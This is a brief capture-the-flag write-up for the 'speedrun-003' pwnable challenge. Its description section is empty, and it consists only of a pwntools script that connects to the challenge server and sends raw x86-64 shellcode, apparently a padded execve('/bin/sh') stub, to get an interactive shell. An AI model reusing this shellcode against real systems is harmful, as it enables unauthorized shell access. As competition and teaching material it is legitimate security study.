# **speedrun-003**

#### tag : pwnable, shellcode

-----------------------------------------------

#### Description

-----------------------------------------------

#### Solution

```python
from pwn import *

r = remote('speedrun-003.quals2019.oooverflow.io', 31337)

sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x01\x01\x56'

r.recvuntil('drift\n')
r.send(sh)
r.interactive()
```
